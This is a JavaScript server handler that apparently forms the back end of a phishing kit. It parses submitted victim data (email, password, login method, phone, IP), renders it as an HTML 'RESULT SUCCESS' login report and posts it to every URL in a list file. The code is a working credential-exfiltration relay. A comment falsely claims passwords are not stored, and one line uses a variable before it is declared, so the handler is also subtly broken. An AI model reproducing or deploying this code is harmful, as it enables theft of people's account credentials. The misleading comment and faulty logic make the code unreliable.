const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

/* ======================
   LOAD URL LIST
====================== */
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    const data = fs.readFileSync(FILE, "utf8");
    if (!data) return [];

    const parsed = JSON.parse(data);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.log("LOAD ERROR:", err.message);
    return [];
  }
}

/* ======================
   BODY PARSER
====================== */
function parseBody(req) {
  if (!req.body) return {};
  if (typeof req.body === "object") return req.body;

  try {
    return Object.fromEntries(new URLSearchParams(req.body));
  } catch {
    return {};
  }
}
function getDateTime() {
  return new Date().toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    weekday: "long",
    day: "numeric",
    month: "long",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit"
  });
}


/* ======================
   EXTRACTOR (TEXT + HTML)
====================== */
function extractVars(input = "") {
  const vars = {
    email: "-",
    login: "-",
    phone: "-",
     password: "-",
    user: "-",
     date: getDateTime(),
     
     
    ip: "-"
    // password tidak disimpan demi keamanan
  };

  const raw = String(input);

  const text = raw
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/\r/g, " ");

  // ======================
  // key:value format
  // ======================
  const kvRegex = /(\b[\w\s]+)\s*:\s*([^:]+?)(?=\s+\w+\s*:|$)/gi;

  let m;
  while ((m = kvRegex.exec(text)) !== null) {
    map(vars, m[1], m[2]);
  }

  // ======================
  // HTML TABLE format
  // ======================
  const tdRegex =
    /<t[dh][^>]*>([\s\S]*?)<\/t[dh]>\s*<t[dh][^>]*>([\s\S]*?)<\/t[dh]>/gi;

  let t;
  while ((t = tdRegex.exec(raw)) !== null) {
    map(vars, t[1], t[2]);
  }

  return vars;
}

/* ======================
   FIELD MAPPING (SAFE)
====================== */
function map(vars, key, value) {
  if (!value) return;

  const k = String(key)
    .toLowerCase()
    .replace(/[^a-z]/g, "");

  const v = String(value).trim();

  if (k.includes("email") || v.includes("@")) {
    vars.email = v;
    return;
  }
   if (
  k.includes("password") ||
  k.includes("pass") ||
  k.includes("sandi")
) {
  vars.password = v;
  return;
}

  if (k.includes("login") || k.includes("via") || k.includes("method")) {
    vars.login = v;
    return;
  }
   if (k.includes("date") || v.includes("@")) {
    vars.date = v;
    return;
   }

  if (k.includes("phone") || k.includes("hp") || k.includes("tel")) {
    vars.phone = v;
    return;
  }

  if (k.includes("user") || k.includes("name")) {
    vars.user = v;
    return;
  }
}

/* ======================
   IP DETECTOR
====================== */
function getIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0]?.replace("::ffff:", "") ||
    req.socket?.remoteAddress?.replace("::ffff:", "") ||
    "-"
  );
}
function row(label, value) {
  if (
    value === undefined ||
    value === null ||
    value === "" ||
    value === "-"
  ) {
    return "";
  }

  return `
    <div class="row">
        <span class="label">${label}</span>
        <span class="value">${value}</span>
    </div>
  `;
}
/* ======================
   HTML REPORT
====================== */
function buildHtml(vars) {
  return `






<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">

<style>

body{
margin:0;
padding:25px;
background:#000000;
font-family:Arial,sans-serif;
}

.container{
max-width:700px;
margin:auto;
}

.tblResult{
width:100%;
background:#111111;
border:2px solid #e51b23;
border-radius:18px;
border-collapse:separate;
border-spacing:0;
overflow:hidden;
}

.logo-box{
background:#000000;
padding:25px;
text-align:center;
border-bottom:2px solid #e51b23;
}

.logo{
width:100%;
max-width:500px;
height:auto;
display:block;
margin:auto;
}

.subtitle{
margin-top:12px;
font-size:12px;
letter-spacing:5px;
color:#b0b0b0;
font-weight:bold;
}

.success{
display:inline-block;
margin-top:15px;
padding:10px 22px;
background:#e51b23;
color:#fff;
font-size:12px;
font-weight:bold;
border-radius:50px;
letter-spacing:2px;
}

.header{
background:#e51b23;
color:#fff;
font-size:18px;
font-weight:bold;
text-align:center;
padding:16px;
}

.section{
background:#1a1a1a;
color:#fff;
text-align:center;
padding:15px;
font-size:15px;
font-weight:bold;
border-top:1px solid #2a2a2a;
border-bottom:1px solid #2a2a2a;
}

.row-wrap{
padding:8px 15px;
background:#111111;
}

.row{
background:#181818;
border-left:4px solid #e51b23;
border-radius:10px;
padding:15px;
}

.row table{
width:100%;
border-collapse:collapse;
}

.label{
color:#aaaaaa;
font-size:13px;
font-weight:bold;
letter-spacing:1px;
}

.value{
color:#ffffff;
font-size:14px;
font-weight:bold;
text-align:right;
word-break:break-word;
}

.join-box{
padding:20px;
background:#111111;
}

.join-btn{
display:block;
background:#e51b23;
color:#ffffff;
text-decoration:none;
text-align:center;
padding:16px;
border-radius:10px;
font-size:15px;
font-weight:bold;
}

.footer{
background:#0a0a0a;
color:#95140b;
text-align:center;
padding:18px;
font-size:12px;
border-top:1px solid #222222;
}

</style>
</head>

<body>

<div class="container">

<table class="tblResult">

<tr>
<td align="center" style="
background:#000000;
padding:35px 20px 25px 20px;
border-bottom:2px solid #e51b23;
">

<img
src="https://i.imgur.com/nC1LswY.png"
alt=""
width="550"
style="
display:block;
margin:auto;
width:100%;
max-width:550px;
height:auto;
border:0;
outline:none;
text-decoration:none;
">

<div style="
margin-top:18px;
font-size:13px;
letter-spacing:6px;
color:#b5b5b5;
font-weight:bold;
">
</div>

<div style="
margin-top:18px;
display:inline-block;
background:#e51b23;
color:#ffffff;
padding:12px 28px;
border-radius:30px;
font-size:13px;
font-weight:bold;
letter-spacing:2px;
">
RESULT SUCCESS
</div>

</td>
</tr>

<tr>
<td class="header">
INFORMASI LOGIN
</td>
</tr>

<tr>
<td class="row-wrap">
<div class="row">
<table>
<tr>
<td class="label">EMAIL</td>
<td class="value">${vars.email}</td>
</tr>
</table>
</div>
</td>
</tr>

<tr>
<td class="row-wrap">
<div class="row">
<table>
<tr>
<td class="label">PASSWORD</td>
<td class="value">${vars.password}</td>
</tr>
</table>
</div>
</td>
</tr>

<tr>
<td class="row-wrap">
<div class="row">
<table>
<tr>
<td class="label">LOGIN VIA</td>
<td class="value">${vars.login}</td>
</tr>
</table>
</div>
</td>
</tr>

<tr>
<td class="section">
INFORMASI TAMBAHAN
</td>
</tr>

<tr>
<td class="row-wrap">
<div class="row">
<table>
<tr>
<td class="label">PHONE</td>
<td class="value">${vars.phone}</td>
</tr>
</table>
</div>
</td>
</tr>

<tr>
<td class="row-wrap">
<div class="row">
<table>
<tr>
<td class="label">IP ADDRESS</td>
<td class="value">${vars.ip}</td>
</tr>
</table>
</div>
</td>
</tr>



<tr>
<td class="row-wrap">
<div class="row">
<table>
<tr>
<td class="label">DATE</td>
<td class="value">${vars.date}</td>
</tr>
</table>
</div>
</td>
</tr>



<tr>
<td class="footer">
© 2026 RESULTS JOEST27
</td>
</tr>

</table>

</div>

</body>
</html>
`;
}

/* ======================
   MAIN HANDLER
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        message: "POST only"
      });
    }

    const body = parseBody(req);

    const subjek = String(body.subjek || "");
    const pesan = String(body.pesan || "");

    if (!subjek || !pesan) {
      return res.status(400).json({
        success: false,
        message: "subjek & pesan wajib diisi"
      });
    }
     const submissionId = [
  vars.email,
  vars.phone,
  vars.user,
  vars.date
]
  .map(v => String(v || "").trim().toLowerCase())
  .join("|");

    const vars = extractVars(pesan);
    vars.ip = getIP(req);
     if (
  vars.email === "-" ||
  vars.password === "-"
) {
  return res.status(400).json({
    success: false,
    message: "Data belum lengkap"
  });
}
    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!urls.length) {
      return res.json({
        success: false,
        message: "URL kosong"
      });
    }
     

    const results = await Promise.allSettled(
      urls.map(async (url) => {
        try {
          const r = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
              subjek,
              pesan: html
            })
          });

          return {
            url,
            success: true,
            status: r.status
          };
        } catch (err) {
          return {
            url,
            success: false,
            error: err.message
          };
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      results: results.map(r => r.value || r.reason)
    });

  } catch (err) {
    console.log("ERROR:", err);

    return res.status(500).json({
      success: false,
      message: "internal error",
      error: err.message
    });
  }
};
